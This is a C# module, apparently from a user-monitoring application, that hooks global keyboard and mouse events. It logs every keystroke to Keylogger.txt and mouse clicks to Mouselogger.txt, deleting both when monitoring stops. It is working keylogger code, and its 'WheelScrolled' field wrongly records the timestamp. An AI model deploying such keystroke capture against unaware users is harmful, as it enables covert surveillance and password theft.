using System.IO;
using System.Reflection;
using RBS;
using Gma.System.MouseKeyHook;

namespace RBS.Monitoring_Engine
{
    public static class User_Input_Monitoring
    {      
        private static IKeyboardMouseEvents m_GlobalHook;

        public static void InitialiseUserInputMonitoring()
        {
           
            GlobalResources.UserInputMonitoringIsOn += GlobalResources_UserInputMonitoringIsOn;
            GlobalResources.UserInputMonitoringIsOff += GlobalResources_UserInputMonitoringIsOff;
        }

        private static void GlobalResources_UserInputMonitoringIsOn(object sender, System.EventArgs e)
        {
            StartUIM();
        }
        private static void GlobalResources_UserInputMonitoringIsOff(object sender, System.EventArgs e)
        {
            StopUIM();
        }

        public static void StartUIM()
        {
            m_GlobalHook = Hook.GlobalEvents();
            m_GlobalHook.KeyPress += GlobalHookKeyPress;
            m_GlobalHook.MouseDownExt += GlobalHookMouseDownExt;
        }

       
        private static void GlobalHookKeyPress(object sender, System.Windows.Forms.KeyPressEventArgs e)
        {
            using (StreamWriter writer = new StreamWriter(GlobalResources.Path + @"Keylogger.txt", true))
            {
                writer.Write(e.KeyChar);
            }
            GlobalResources.NewKeyStrokesHasCaptured();
        }

        private static void GlobalHookMouseDownExt(object sender, MouseEventExtArgs e)
        {
            using (StreamWriter writer = new StreamWriter(GlobalResources.Path + "Mouselogger.txt", true))
            {
                writer.Write("Button : " + e.Button.ToString() + "\t");
                writer.Write("\tLocation : "+ e.Location.ToString() + "\t");
                writer.Write("\tTime : " + e.Timestamp.ToString() + "\t");
                writer.Write("\tWheelScrolled : " + e.Timestamp.ToString() + "\t");
                writer.Write("\n");
            }
            GlobalResources.NewMouseStrokesHasCaptured();
        }

        public static void StopUIM()
        {
            m_GlobalHook.KeyPress -= GlobalHookKeyPress;
            m_GlobalHook.MouseDownExt -= GlobalHookMouseDownExt;
            m_GlobalHook.Dispose();
            File.Delete(GlobalResources.Path + "Keylogger.txt");
            File.Delete(GlobalResources.Path + "Mouselogger.txt");
        }
    }   
}
